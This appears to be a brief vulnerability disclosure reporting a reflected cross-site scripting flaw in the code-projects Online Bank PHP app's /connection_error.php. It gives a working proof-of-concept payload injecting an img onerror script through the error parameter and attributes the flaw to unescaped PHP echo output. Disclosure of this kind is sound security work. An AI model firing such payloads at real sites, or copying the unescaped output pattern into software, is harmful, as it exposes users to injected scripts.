# Summary
There is a XSS vulnerability in code-project Online Bank (https://code-projects.org/online-bank-in-php-css-javascript-and-mysql-free-download/).

Affected component is `/connection_error.php`.

# Details
In `/connection_error.php?error=xxx`,
we use this xss payload:
```
/connection_error.php?error=<img/src="x"/onerror=alert(`xss`);>
```
![image](https://github.com/user-attachments/assets/3ae6ac1a-da03-4fcf-bb84-18fa951cacf0)
![image](https://github.com/user-attachments/assets/8f3e7156-81cc-4768-a157-5acc5f063eb5)

Audit the code, finding that it uses `<?php echo xxx` in HTML, however, there is no filter for output of echo, which leads to cross site script attack:
![image](https://github.com/user-attachments/assets/b8cb17f2-c194-43b7-a7e8-5abbdd622424)



# PoC
```
/connection_error.php?error=<img/src="x"/onerror=alert(`xss`);>
```
![image](https://github.com/user-attachments/assets/3ae6ac1a-da03-4fcf-bb84-18fa951cacf0)
